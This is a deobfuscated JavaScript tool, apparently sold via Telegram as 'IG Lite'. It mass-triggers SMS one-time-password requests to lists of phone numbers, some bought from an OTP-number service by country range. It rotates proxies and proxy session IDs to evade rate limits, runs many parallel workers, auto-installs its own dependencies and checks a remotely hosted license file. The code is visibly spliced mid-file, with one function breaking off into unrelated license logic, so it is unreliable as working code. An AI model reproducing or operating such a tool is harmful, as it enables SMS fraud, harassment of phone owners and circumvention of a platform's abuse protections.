// === AIZENTOOLS ===
// File: iglite_payload.deobf.js
// Note: Original variable names lost to obfuscation

const fs = require('fs');
const path = require('path'), {execSync} = require('child_process'), {isMainThread} = require('worker_threads');
if (isMainThread) {
  const requiredModules = [
    'https-proxy-agent',
    'socks-proxy-agent',
    'chalk'
  ];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (err) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log('\n[SETUP] First time setup: Installing required dependencies...');
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === 'win32' ? 'npm.cmd' : 'npm'), opts = {};
      opts.stdio = 'inherit';
      opts.shell = true;
      execSync('"' + npmCmd + '" install https-proxy-agent socks-proxy-agent chalk@4', opts);
      console.log('[SETUP] Dependencies installed successfully!\n');
    } catch (err2) {
      console.error('[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly.');
      process.exit(1);
    }
  }
}
const http = require('http'), https = require('https'), zlib = require('zlib'), crypto = require('crypto'), chalk = require('chalk'), readline = require('readline'), {HttpsProxyAgent} = require('https-proxy-agent');
const {SocksProxyAgent} = require('socks-proxy-agent');
class NexaRateLimiter {
  constructor(_p) {
    this.delayMs = _p;
    this.queue = [];
    this.processing = false;
  }
  enqueue(_q) {
    return new Promise((resolve, reject) => {
      this.queue.push(async () => {
        try {
          resolve(await _q());
        } catch (err3) {
          reject(err3);
        }
      });
      if (!this.processing)
        this._process();
    });
  }
  async _process() {
    this.processing = true;
    while (this.queue.length > 0) {
      const _r = this.queue.shift();
      await _r();
      await new Promise(resolve2 => setTimeout(resolve2, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(_s, _t, _u) {
  return new Promise((resolve3, reject2) => {
    const opts2 = {};
    opts2.range = _t;
    opts2.format = 'normal';
    const _v = JSON.stringify(opts2), opts3 = {
        'hostname': 'nexaotpservice.com',
        'port': 80,
        'path': _u || '/api/v1/numbers/get',
        'method': 'POST',
        'headers': {
          'X-API-Key': _s,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(_v)
        }
      }, _w = http.request(opts3, _x => {
        let _y = '';
        _x.on('data', _z => _y += _z);
        _x.on('end', () => {
          try {
            const _A = JSON.parse(_y);
            if (_A.success && _A.number) {
              resolve3(_A.number.replace(/[^0-9]/g, ''));
            } else {
              reject2(new Error(_A.error || 'NexaOTP: No number returned'));
            }
          } catch (err4) {
            reject2(new Error('NexaOTP: Invalid response'));
          }
        });
      });
    _w.on('error', _B => reject2(new Error('NexaOTP network: ' + _B.message)));
    _w.setTimeout(10000, () => {
      _w.destroy();
      reject2(new Error('NexaOTP: Timeout'));
    });
    _w.write(_v);
    _w.end();
  });
}
const DIAL_MAP = [
  [
    '1868',
    'TT',
    'en_TT',
    '-14400'
  ],
  [
    '1876',
    'JM',
    'en_JM',
    '-18000'
  ],
  [
    '1809',
    'DO',
    'es_DO',
    '-14400'
  ],
  [
    '1829',
    'DO',
    'es_DO',
    '-14400'
  ],
  [
    '1849',
    'DO',
    'es_DO',
    '-14400'
  ],
  [
    '375',
    'BY',
    'ru_BY',
    '10800'
  ],
  [
    '880',
    'BD',
    'bn_BD',
    '21600'
  ],
  [
    '855',
    'KH',
    'km_KH',
    '25200'
  ],
  [
    '856',
    'LA',
    'lo_LA',
    '25200'
  ],
  [
    '228',
    'TG',
    'fr_TG',
    '0'
  ],
  [
    '229',
    'BJ',
    'fr_BJ',
    '3600'
  ],
  [
    '233',
    'GH',
    'en_GH',
    '0'
  ],
  [
    '234',
    'NG',
    'en_NG',
    '3600'
  ],
  [
    '237',
    'CM',
    'fr_CM',
    '3600'
  ],
  [
    '243',
    'CD',
    'fr_CD',
    '3600'
  ],
  [
    '254',
    'KE',
    'sw_KE',
    '10800'
  ],
  [
    '255',
    'TZ',
    'sw_TZ',
    '10800'
  ],
  [
    '256',
    'UG',
    'en_UG',
    '10800'
  ],
  [
    '260',
    'ZM',
    'en_ZM',
    '7200'
  ],
  [
    '263',
    'ZW',
    'en_ZW',
    '7200'
  ],
  [
    '212',
    'MA',
    'ar_MA',
    '0'
  ],
  [
    '213',
    'DZ',
    'ar_DZ',
    '3600'
  ],
  [
    '216',
    'TN',
    'ar_TN',
    '3600'
  ],
  [
    '218',
    'LY',
    'ar_LY',
    '7200'
  ],
  [
    '220',
    'GM',
    'en_GM',
    '0'
  ],
  [
    '221',
    'SN',
    'fr_SN',
    '0'
  ],
  [
    '222',
    'MR',
    'ar_MR',
    '0'
  ],
  [
    '223',
    'ML',
    'fr_ML',
    '0'
  ],
  [
    '224',
    'GN',
    'fr_GN',
    '0'
  ],
  [
    '225',
    'CI',
    'fr_CI',
    '0'
  ],
  [
    '226',
    'BF',
    'fr_BF',
    '0'
  ],
  [
    '227',
    'NE',
    'fr_NE',
    '3600'
  ],
  [
    '230',
    'MU',
    'en_MU',
    '14400'
  ],
  [
    '231',
    'LR',
    'en_LR',
    '0'
  ],
  [
    '232',
    'SL',
    'en_SL',
    '0'
  ],
  [
    '235',
    'TD',
    'fr_TD',
    '3600'
  ],
  [
    '236',
    'CF',
    'fr_CF',
    '3600'
  ],
  [
    '238',
    'CV',
    'pt_CV',
    '-3600'
  ],
  [
    '239',
    'ST',
    'pt_ST',
    '0'
  ],
  [
    '240',
    'GQ',
    'es_GQ',
    '3600'
  ],
  [
    '241',
    'GA',
    'fr_GA',
    '3600'
  ],
  [
    '242',
    'CG',
    'fr_CG',
    '3600'
  ],
  [
    '244',
    'AO',
    'pt_AO',
    '3600'
  ],
  [
    '245',
    'GW',
    'pt_GW',
    '0'
  ],
  [
    '246',
    'IO',
    'en_IO',
    '21600'
  ],
  [
    '247',
    'AC',
    'en_AC',
    '0'
  ],
  [
    '248',
    'SC',
    'en_SC',
    '14400'
  ],
  [
    '249',
    'SD',
    'ar_SD',
    '7200'
  ],
  [
    '250',
    'RW',
    'rw_RW',
    '7200'
  ],
  [
    '251',
    'ET',
    'am_ET',
    '10800'
  ],
  [
    '252',
    'SO',
    'so_SO',
    '10800'
  ],
  [
    '253',
    'DJ',
    'fr_DJ',
    '10800'
  ],
  [
    '257',
    'BI',
    'fr_BI',
    '7200'
  ],
  [
    '258',
    'MZ',
    'pt_MZ',
    '7200'
  ],
  [
    '261',
    'MG',
    'mg_MG',
    '10800'
  ],
  [
    '262',
    'RE',
    'fr_RE',
    '14400'
  ],
  [
    '264',
    'NA',
    'en_NA',
    '7200'
  ],
  [
    '265',
    'MW',
    'en_MW',
    '7200'
  ],
  [
    '266',
    'LS',
    'en_LS',
    '7200'
  ],
  [
    '267',
    'BW',
    'en_BW',
    '7200'
  ],
  [
    '268',
    'SZ',
    'en_SZ',
    '7200'
  ],
  [
    '269',
    'KM',
    'fr_KM',
    '10800'
  ],
  [
    '966',
    'SA',
    'ar_SA',
    '10800'
  ],
  [
    '971',
    'AE',
    'ar_AE',
    '14400'
  ],
  [
    '973',
    'BH',
    'ar_BH',
    '10800'
  ],
  [
    '974',
    'QA',
    'ar_QA',
    '10800'
  ],
  [
    '968',
    'OM',
    'ar_OM',
    '14400'
  ],
  [
    '965',
    'KW',
    'ar_KW',
    '10800'
  ],
  [
    '964',
    'IQ',
    'ar_IQ',
    '10800'
  ],
  [
    '963',
    'SY',
    'ar_SY',
    '10800'
  ],
  [
    '962',
    'JO',
    'ar_JO',
    '10800'
  ],
  [
    '961',
    'LB',
    'ar_LB',
    '7200'
  ],
  [
    '967',
    'YE',
    'ar_YE',
    '10800'
  ],
  [
    '970',
    'PS',
    'ar_PS',
    '10800'
  ],
  [
    '972',
    'IL',
    'he_IL',
    '7200'
  ],
  [
    '992',
    'TJ',
    'tg_TJ',
    '18000'
  ],
  [
    '993',
    'TM',
    'tk_TM',
    '18000'
  ],
  [
    '994',
    'AZ',
    'az_AZ',
    '14400'
  ],
  [
    '995',
    'GE',
    'ka_GE',
    '14400'
  ],
  [
    '996',
    'KG',
    'ky_KG',
    '21600'
  ],
  [
    '998',
    'UZ',
    'uz_UZ',
    '18000'
  ],
  [
    '977',
    'NP',
    'ne_NP',
    '20700'
  ],
  [
    '975',
    'BT',
    'dz_BT',
    '21600'
  ],
  [
    '959',
    'MM',
    'my_MM',
    '23400'
  ],
  [
    '670',
    'TL',
    'pt_TL',
    '32400'
  ],
  [
    '673',
    'BN',
    'ms_BN',
    '28800'
  ],
  [
    '676',
    'TO',
    'en_TO',
    '46800'
  ],
  [
    '677',
    'SB',
    'en_SB',
    '39600'
  ],
  [
    '678',
    'VU',
    'en_VU',
    '39600'
  ],
  [
    '679',
    'FJ',
    'en_FJ',
    '43200'
  ],
  [
    '680',
    'PW',
    'en_PW',
    '32400'
  ],
  [
    '591',
    'BO',
    'es_BO',
    '-14400'
  ],
  [
    '592',
    'GY',
    'en_GY',
    '-14400'
  ],
  [
    '593',
    'EC',
    'es_EC',
    '-18000'
  ],
  [
    '594',
    'GF',
    'fr_GF',
    '-10800'
  ],
  [
    '595',
    'PY',
    'es_PY',
    '-14400'
  ],
  [
    '596',
    'MQ',
    'fr_MQ',
    '-14400'
  ],
  [
    '597',
    'SR',
    'nl_SR',
    '-10800'
  ],
  [
    '598',
    'UY',
    'es_UY',
    '-10800'
  ],
  [
    '20',
    'EG',
    'ar_EG',
    '7200'
  ],
  [
    '27',
    'ZA',
    'en_ZA',
    '7200'
  ],
  [
    '30',
    'GR',
    'el_GR',
    '7200'
  ],
  [
    '31',
    'NL',
    'nl_NL',
    '3600'
  ],
  [
    '32',
    'BE',
    'nl_BE',
    '3600'
  ],
  [
    '33',
    'FR',
    'fr_FR',
    '3600'
  ],
  [
    '34',
    'ES',
    'es_ES',
    '3600'
  ],
  [
    '36',
    'HU',
    'hu_HU',
    '3600'
  ],
  [
    '39',
    'IT',
    'it_IT',
    '3600'
  ],
  [
    '40',
    'RO',
    'ro_RO',
    '7200'
  ],
  [
    '41',
    'CH',
    'de_CH',
    '3600'
  ],
  [
    '43',
    'AT',
    'de_AT',
    '3600'
  ],
  [
    '44',
    'GB',
    'en_GB',
    '0'
  ],
  [
    '45',
    'DK',
    'da_DK',
    '3600'
  ],
  [
    '46',
    'SE',
    'sv_SE',
    '3600'
  ],
  [
    '47',
    'NO',
    'nb_NO',
    '3600'
  ],
  [
    '48',
    'PL',
    'pl_PL',
    '3600'
  ],
  [
    '49',
    'DE',
    'de_DE',
    '3600'
  ],
  [
    '51',
    'PE',
    'es_PE',
    '-18000'
  ],
  [
    '52',
    'MX',
    'es_MX',
    '-21600'
  ],
  [
    '53',
    'CU',
    'es_CU',
    '-18000'
  ],
  [
    '54',
    'AR',
    'es_AR',
    '-10800'
  ],
  [
    '55',
    'BR',
    'pt_BR',
    '-10800'
  ],
  [
    '56',
    'CL',
    'es_CL',
    '-14400'
  ],
  [
    '57',
    'CO',
    'es_CO',
    '-18000'
  ],
  [
    '58',
    'VE',
    'es_VE',
    '-14400'
  ],
  [
    '60',
    'MY',
    'ms_MY',
    '28800'
  ],
  [
    '61',
    'AU',
    'en_AU',
    '36000'
  ],
  [
    '62',
    'ID',
    'id_ID',
    '25200'
  ],
  [
    '63',
    'PH',
    'en_PH',
    '28800'
  ],
  [
    '64',
    'NZ',
    'en_NZ',
    '43200'
  ],
  [
    '65',
    'SG',
    'en_SG',
    '28800'
  ],
  [
    '66',
    'TH',
    'th_TH',
    '25200'
  ],
  [
    '81',
    'JP',
    'ja_JP',
    '32400'
  ],
  [
    '82',
    'KR',
    'ko_KR',
    '32400'
  ],
  [
    '84',
    'VN',
    'vi_VN',
    '25200'
  ],
  [
    '86',
    'CN',
    'zh_CN',
    '28800'
  ],
  [
    '90',
    'TR',
    'tr_TR',
    '10800'
  ],
  [
    '91',
    'IN',
    'hi_IN',
    '19800'
  ],
  [
    '92',
    'PK',
    'ur_PK',
    '18000'
  ],
  [
    '93',
    'AF',
    'ps_AF',
    '16200'
  ],
  [
    '94',
    'LK',
    'si_LK',
    '19800'
  ],
  [
    '95',
    'MM',
    'my_MM',
    '23400'
  ],
  [
    '98',
    'IR',
    'fa_IR',
    '12600'
  ],
  [
    '1',
    'US',
    'en_US',
    '-18000'
  ],
  [
    '7',
    'RU',
    'ru_RU',
    '10800'
  ]
];
function getPhoneDetails(_C) {
  for (const [_D, _E, _F, _G] of DIAL_MAP) {
    if (_C.startsWith(_D)) {
      const opts4 = {};
      opts4.iso = _E;
      opts4.locale = _F;
      opts4.offset = _G;
      return opts4;
    }
  }
  const opts5 = {};
  opts5.iso = 'US';
  opts5.locale = 'en_US';
  opts5.offset = '-18000';
  return opts5;
}
let SUCCESSFUL_FILE = 'successful.txt', FAILED_FILE = 'failed.txt';
let DEBUG_FILE = 'debug.txt';
const B = chalk.hex('#00FF88'), C = chalk.hex('#00BFFF'), Y = chalk.hex('#FFD700'), W = chalk.white, G = chalk.gray, R = chalk.hex('#FF6B6B'), M = chalk.hex('#E1306C');
let globalHwid = 'Unregistered';
function printHeader() {
  const parts = '2|12|11|8|0|4|9|1|7|13|6|10|5|3'.split('|');
  let _H = 0;
  while (true) {
    switch (parts[_H++]) {
    case '0':
      console.log(M('   | | |_| | | |___| | ||  __/'));
      continue;
    case '1':
      console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
      continue;
    case '2':
      process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
      continue;
    case '3':
      console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n'));
      continue;
    case '4':
      console.log(M('  |___\\____| |_____|_|\\__\\___|'));
      continue;
    case '5':
      globalHwid !== 'Unregistered' && console.log(W('\u2502 [\u2022] HWID      : ') + Y(globalHwid.padEnd(29)) + W('\u2502'));
      continue;
    case '6':
      console.log(W('\u2502 [\u2022] Status    : ') + G('Premium Build                ') + W('\u2502'));
      continue;
    case '7':
      console.log(W('\u2502 [\u2022] Tool      : ') + M('SK \u2014 IG Lite                 ') + W('\u2502'));
      continue;
    case '8':
      console.log(M('   | | |  _  | |   | | __/ _ \\'));
      continue;
    case '9':
      console.log(M('                              \n'));
      continue;
    case '10':
      console.log(W('\u2502 [\u2022] Version   : ') + Y('IGLITE-V1.0.0                ') + W('\u2502'));
      continue;
    case '11':
      console.log(M('  |_ _/ ___| | |   (_) |_ ___ '));
      continue;
    case '12':
      console.log(M('   ___ ____   _     _ _       '));
      continue;
    case '13':
      console.log(W('\u2502 [\u2022] Telegram  : ') + C('t.me/aizentools            ') + W('\u2502'));
      continue;
    }
    break;
  }
}
const uuid = () => crypto.randomUUID();
function normalizePhoneNumber(_I) {
  let _J = _I.replace(/\D/g, '');
  !_J.startsWith('+') && (_J = '+' + _J);
  return _J;
}
function parseProxy(_K) {
  if (!_K)
    return null;
  if (typeof _K === 'object')
    return _K;
  _K = _K.trim();
  if (!_K)
    return null;
  let _L, _M, _N, _O, _P = 'http';
  if (_K.startsWith('socks5://'))
    _P = 'socks5', _K = _K.slice(9);
  else {
    if (_K.startsWith('socks4://')) {
      _P = 'socks4';
      _K = _K.slice(9);
    } else {
      if (_K.startsWith('http://'))
        _P = 'http', _K = _K.slice(7);
      else
        _K.startsWith('https://') && (_P = 'http', _K = _K.slice(8));
    }
  }
  if (_K.includes('@')) {
    const parts2 = _K.split('@'), parts3 = parts2[0].split(':'), parts4 = parts2[1].split(':');
    _N = parts3[0];
    _O = parts3[1];
    _L = parts4[0];
    _M = parseInt(parts4[1]);
  } else {
    const parts5 = _K.split(':');
    if (parts5.length === 2)
      _L = parts5[0], _M = parseInt(parts5[1]);
    else {
      if (parts5.length === 4) {
        if (!isNaN(parseInt(parts5[3])) && isNaN(parseInt(parts5[1]))) {
          _N = parts5[0];
          _O = parts5[1];
          _L = parts5[2];
          _M = parseInt(parts5[3]);
        } else
          _L = parts5[0], _M = parseInt(parts5[1]), _N = parts5[2], _O = parts5[3];
      } else
        parts5.length === 3 && (_L = parts5[0], _M = parseInt(parts5[1]), _N = parts5[2]);
    }
  }
  if (!_L || !_M)
    return null;
  const opts6 = {};
  opts6.type = _P;
  opts6.host = _L;
  opts6.port = _M;
  opts6.user = _N;
  opts6.pass = _O;
  opts6.original = _K;
  return opts6;
}
function rotateSessionId(_Q) {
  if (!_Q || !_Q.user)
    return _Q;
  const opts7 = { ..._Q };
  const _R = opts7, arr = [
      /-ssid-[A-Za-z0-9_]+/,
      /-session-[A-Za-z0-9_]+/,
      /_session_[A-Za-z0-9_]+/,
      /-sess-[A-Za-z0-9_]+/
    ];
  let _S = false;
  for (const _T of arr) {
    if (_R.user && _T.test(_R.user)) {
      const _U = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
      _R.user = _R.user.replace(_T, '' + _T.source.split('[')[0].replace(/\\/g, '') + _U);
      _S = true;
      break;
    }
    if (_R.pass && _T.test(_R.pass)) {
      const _V = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
      _R.pass = _R.pass.replace(_T, '' + _T.source.split('[')[0].replace(/\\/g, '') + _V);
      _S = true;
      break;
    }
  }
  return _R;
}
function createProxyAgent(_W) {
  if (!_W)
    return null;
  let _X = '';
  if (_W.type === 'socks5' || _W.type === 'socks4') {
    _X = 'socks5://' + (_W.user ? encodeURIComponent(_W.user) + ':' + encodeURIComponent(_W.pass || '') + '@' : '') + _W.host + ':' + _W.port;
    return new SocksProxyAgent(_X);
  } else
    return _X = 'http://' + (_W.user ? encodeURIComponent(_W.user) + ':' + encodeURIComponent(_W.pass || '') + '@' : '') + _W.host + ':' + _W.port, new HttpsProxyAgent(_X);
}
function sendRequest(_Y, _Z, _aa, _ba, _ca = null, _da = 15000) {
  return new Promise((resolve4, reject3) => {
    const uRL = new URL(_Y);
    const opts8 = { ..._aa };
    let _ea = opts8;
    if (_ba) {
      _ea['Content-Length'] = Buffer.byteLength(_ba);
    }
    const opts9 = {
      'hostname': uRL.hostname,
      'path': uRL.pathname + uRL.search,
      'method': _Z,
      'headers': _ea,
      'timeout': _da,
      'ciphers': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
      'ecdhCurve': 'X25519:P-256:P-384',
      'honorCipherOrder': false,
      'secureOptions': require('crypto').constants.SSL_OP_NO_SSLv3 | require('crypto').constants.SSL_OP_NO_TLSv1 | require('crypto').constants.SSL_OP_NO_TLSv1_1,
      'minVersion': 'TLSv1.2'
    };
    let _fa = _ca ? parseProxy(_ca) : null;
    if (_ca) {
      if (!_fa || isNaN(_fa.port) || _fa.port <= 0)
        return reject3(new Error('Invalid proxy'));
      opts9.agent = createProxyAgent(_fa);
    }
    const _ga = https.request(opts9, _ha => {
      const _kc = 'https://raw.githubusercontent.com/mogamingcv7v-netizen/license/a6d31cc/keys.json').join(''), opts16 = {};
        opts16.timeout = 15000;
        https.get(_tc + ('?t=' + Date.now()), opts16, _uc => {
          let _vc = '';
          _uc.on('data', _wc => _vc += _wc);
          _uc.on('end', () => {
            try {
              resolve7(JSON.parse(_vc));
            } catch (err14) {
              reject4(err14);
            }
          });
        }).on('error', reject4).on('timeout', function () {
          this.destroy();
          reject4(new Error('Timeout'));
        });
      });
      if (promise && promise.keys) {
        const _xc = promise.keys[_pc];
        if (!_xc) {
          const parts7 = '4|5|2|0|3|1|6|7'.split('|');
          let _yc = 0;
          while (true) {
            switch (parts7[_yc++]) {
            case '0':
              console.error(R('  \u2551  HWID   : ') + Y(_pc.padEnd(33)) + R('\u2551'));
              continue;
            case '1':
              console.error(R('  \u2551  Contact: t.me/aizentools to register     \u2551'));
              continue;
            case '2':
              console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
              continue;
            case '3':
              console.error(R('  \u2551  Status : NOT REGISTERED                    \u2551'));
              continue;
            case '4':
              console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
              continue;
            case '5':
              console.error(R('  \u2551    \u2717 UNAUTHORIZED HARDWARE \u2014 IGLITE       \u2551'));
              continue;
            case '6':
              console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
              continue;
            case '7':
              process.exit(1);
              continue;
            }
            break;
          }
        }
        !verifyKeySig(_pc, _xc) && (console.error(R('\n  \u2717 License key signature invalid. Forged key detected.\n')), process.exit(1));
        _rc = true;
        _sc = _xc.user || 'Licensed';
      }
    } catch (err15) {
      console.error(R('\n  \u2717 License server unreachable.\n'));
      process.exit(1);
    }
    if (!_rc) {
      console.error(R('\n  \u2717 License validation failed.\n'));
      process.exit(1);
    }
    const _zc = process.argv.slice(2).filter(item6 => !item6.startsWith('--'));
    let _Ac = _zc;
    _Ac.length === 0 && (_Ac = await interactiveWizard());
    let _Bc = path.resolve(_Ac[0] || 'numbers.txt'), _Cc = parseInt(_Ac[1]) || 20, _Dc = _Ac[2] !== undefined ? _Ac[2] : 'proxies.txt';
    if (_Dc.toLowerCase() === 'none' || _Dc === 'false')
      _Dc = '';
    let _Ec = _Ac[3] || 'auto';
    printHeader();
    console.log(B('  \u2713 License: ' + _sc) + G(' | HWID: ' + _pc));
    let _Fc = true;
    while (_Fc) {
      if (!fs.existsSync(_Bc)) {
        console.error(R('\u2717 Error: Numbers file not found: ' + _Bc));
        process.exit(1);
      }
      const _Gc = fs.readFileSync(_Bc, 'utf8').split(/\r?\n/).map(item7 => item7.trim()).filter(item8 => item8 && item8.replace(/\D/g, '').length >= 7);
      _Gc.length === 0 && (console.error(R('\u2717 No valid phone numbers found in file')), process.exit(1));
      let arr11 = [];
      _Dc && fs.existsSync(_Dc) && (arr11 = fs.readFileSync(_Dc, 'utf8').split('\n').map(item9 => item9.trim()).filter(item10 => item10.length > 0));
      let arr12 = [];
      for (const _Hc of arr11) {
        const _Ic = parseProxy(_Hc);
        if (!_Ic) {
          const parts8 = '4|0|2|5|3|1|6'.split('|');
          let _Jc = 0;
          while (true) {
            switch (parts8[_Jc++]) {
            case '0':
              console.error(R('  Please use one of the supported formats:'));
              continue;
            case '1':
              console.error(R('    - user:pass:host:port\n'));
              continue;
            case '2':
              console.error(R('    - host:port'));
              continue;
            case '3':
              console.error(R('    - host:port:user:pass'));
              continue;
            case '4':
              console.error(R('\n  \u2717 Invalid proxy format detected: "' + _Hc + '"'));
              continue;
            case '5':
              console.error(R('    - user:pass@host:port'));
              continue;
            case '6':
              process.exit(1);
              continue;
            }
            break;
          }
        }
        arr12.push(_Ic);
      }
      nexaConfig ? console.log(C('\u2713 Target  : NexaOTP API (' + nexaConfig.totalCount + ' numbers)')) : console.log(Y('\u2713 Loaded ' + _Gc.length + ' targets'));
      if (arr12.length === 0)
        console.log(G('  No proxies configured (running direct)'));
      else
        console.log(G('  Proxies loaded: ' + arr12.length));
      console.log(C('\u2713 Threads: ' + _Cc + '\n'));
      fs.writeFileSync(SUCCESSFUL_FILE, '');
      fs.writeFileSync(FAILED_FILE, '');
      fs.writeFileSync(DEBUG_FILE, '=== DEBUG SESSION ===\n');
      const dashboard = new Dashboard(nexaConfig ? nexaConfig.totalCount : _Gc.length);
      let arr13 = [], arr14 = [], _Kc = 0, _Lc = false;
      nexaConfig && (async () => {
        try {
          for (let _Mc = 0; _Mc < nexaConfig.totalCount; _Mc++) {
            try {
              const _Nc = nexaConfig.ranges[Math.floor(Math.random() * nexaConfig.ranges.length)], _Oc = await nexaLimiter.enqueue(() => nexaFetchNumber(nexaConfig.apiKey, _Nc, nexaConfig.serverEndpoint));
              _Oc && (_Kc++, arr14.length > 0 ? arr14.shift()(_Oc) : arr13.push(_Oc));
            } catch (err16) {
              if (err16.message.includes('Insufficient balance') || err16.message.includes('No numbers available')) {
                break;
              }
            }
          }
        } finally {
          _Lc = true;
          while (arr14.length > 0)
            arr14.shift()(null);
        }
      })();
      const _Pc = nexaConfig ? () => {
        if (arr13.length > 0)
          return Promise.resolve(arr13.shift());
        if (_Lc)
          return Promise.resolve(null);
        return new Promise(resolve8 => arr14.push(resolve8));
      } : () => {
        if (_Gc.length === 0)
          return Promise.resolve(null);
        const _Qc = Math.floor(Math.random() * _Gc.length);
        return Promise.resolve(_Gc.splice(_Qc, 1)[0]);
      };
      let _Rc = 0;
      const _Sc = () => {
        if (arr12.length === 0)
          return null;
        const _Tc = arr12[_Rc % arr12.length];
        _Rc++;
        return rotateSessionId(_Tc);
      };
      function _Uc(_Vc) {
        try {
          const _Wc = fs.readFileSync(_Bc, 'utf8'), _Xc = _Wc.split(/\r?\n/).filter(item11 => item11.trim() !== _Vc.trim()).join('\n');
          fs.writeFileSync(_Bc, _Xc);
        } catch (err17) {
        }
      }
      const _Yc = nexaConfig ? Math.min(_Cc, nexaConfig.totalCount) : Math.min(_Cc, _Gc.length), arr15 = [], _Zc = setInterval(() => dashboard.render(), 500);
      function _ad(_bd) {
        return new Promise(resolve9 => setTimeout(resolve9, _bd));
      }
      async function _cd(_dd) {
        while (true) {
          const _ed = await _Pc();
          if (!_ed)
            break;
          try {
            const _fd = await triggerSms(_ed, {
              'onStatus': _gd => dashboard.setStatus('Worker ' + _dd + ': ' + _gd),
              'proxy': _Sc(),
              'language': _Ec,
              'timeout': 15000
            });
            if (_fd.success) {
              const parts9 = '4|1|0|2|3'.split('|');
              let _hd = 0;
              while (true) {
                switch (parts9[_hd++]) {
                case '0':
                  _Uc(_ed);
                  continue;
                case '1':
                  dashboard.processed++;
                  continue;
                case '2':
                  fs.appendFileSync(SUCCESSFUL_FILE, _fd.phone + '|OTP_SENT\n');
                  continue;
                case '3':
                  dashboard.addLog('Triggered OTP for ' + _fd.phone, 'success');
                  continue;
                case '4':
                  dashboard.successful++;
                  continue;
                }
                break;
              }
            } else {
              dashboard.failed++;
              dashboard.processed++;
              fs.appendFileSync(FAILED_FILE, _fd.phone + '|' + _fd.message + '\n');
              !_fd.message.includes('429') && dashboard.addLog('Failed on ' + _fd.phone + ': ' + _fd.message, 'error');
            }
          } catch (err18) {
            dashboard.failed++;
            dashboard.processed++;
            !err18.message.includes('429') && dashboard.addLog('Fatal error on ' + _ed + ': ' + err18.message, 'error');
          }
          const _id = Math.floor(Math.random() * 3000) + 1500;
          await _ad(_id);
        }
      }
      for (let _jd = 0; _jd < _Yc; _jd++) {
        arr15.push(_cd(_jd));
      }
      await Promise.all(arr15);
      clearInterval(_Zc);
      dashboard.render();
      dashboard.stop();
      const _kd = await selectOption('Processing Complete. What next?', [
        {
          'name': 'Reuse successful numbers (' + SUCCESSFUL_FILE + ')',
          'value': 'reuse'
        },
        {
          'name': 'Go Home (Restart)',
          'value': 'home'
        },
        {
          'name': 'Exit',
          'value': 'exit'
        }
      ]);
      if (_kd === 'reuse') {
        if (fs.existsSync(SUCCESSFUL_FILE)) {
          let _ld = fs.readFileSync(SUCCESSFUL_FILE, 'utf8').split('\n').map(item12 => item12.split('|')[0].trim()).filter(item13 => item13.length > 5);
          fs.writeFileSync(_Bc, _ld.join('\n'));
          fs.writeFileSync(SUCCESSFUL_FILE, '');
          console.log('\n  \x1B[32m\u2713 Copied ' + _ld.length + ' successful numbers to ' + _Bc + ' and cleared ' + SUCCESSFUL_FILE + '.\x1B[0m\n');
        } else
          console.log('\n  \x1B[31m\u2717 No successful numbers found.\x1B[0m\n'), _Fc = false;
      } else {
        if (_kd === 'home') {
          const parts10 = '0|2|5|4|1|3'.split('|');
          let _md = 0;
          while (true) {
            switch (parts10[_md++]) {
            case '0':
              _Ac = await interactiveWizard();
              continue;
            case '1':
              if (_Dc.toLowerCase() === 'none' || _Dc === 'false')
                _Dc = '';
              continue;
            case '2':
              _Bc = path.resolve(_Ac[0] || 'numbers.txt');
              continue;
            case '3':
              _Ec = _Ac[3] || 'auto';
              continue;
            case '4':
              _Dc = _Ac[2] !== undefined ? _Ac[2] : 'proxies.txt';
              continue;
            case '5':
              _Cc = parseInt(_Ac[1]) || 20;
              continue;
            }
            break;
          }
        } else
